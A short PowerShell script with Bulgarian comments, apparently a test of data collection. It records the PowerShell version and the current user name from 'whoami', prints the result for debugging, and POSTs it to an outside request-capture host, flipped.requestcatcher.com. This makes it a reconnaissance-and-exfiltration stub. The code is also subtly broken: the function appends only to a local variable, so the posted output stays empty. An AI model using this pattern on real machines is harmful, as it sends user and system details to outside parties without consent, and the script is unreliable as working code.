# ========== Инициализация ==========
$output = ""

function Add-ToOutput {
    param([string]$Title, [object]$Data)
    $output += "`n===== [$Title] =====`n"
    $output += "$($Data | Out-String)`n"
}

# ========== Тестова секция ==========
Add-ToOutput "Test Block" "This is a test entry."
Add-ToOutput "PowerShell Version" $PSVersionTable.PSVersion
Add-ToOutput "Current User" (whoami)

# ========== DEBUG: Показване на съдържание ==========
Write-Host "`n========== DEBUG =========="
Write-Host "OUTPUT LENGTH: $($output.Length)"
Write-Host "OUTPUT CONTENT:"
Write-Host $output
Write-Host "==========================="

# ========== POST към RequestCatcher ==========
try {
    $preview = $output.Substring(0, [Math]::Min(500, $output.Length))
    $body = @{ debug = $preview }
    Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" `
                      -Method POST `
                      -Body $body `
                      -UseBasicParsing
    Write-Host "`nPOST sent successfully!"
} catch {
    Write-Host "`nPOST FAILED: $($_.Exception.Message)"
}
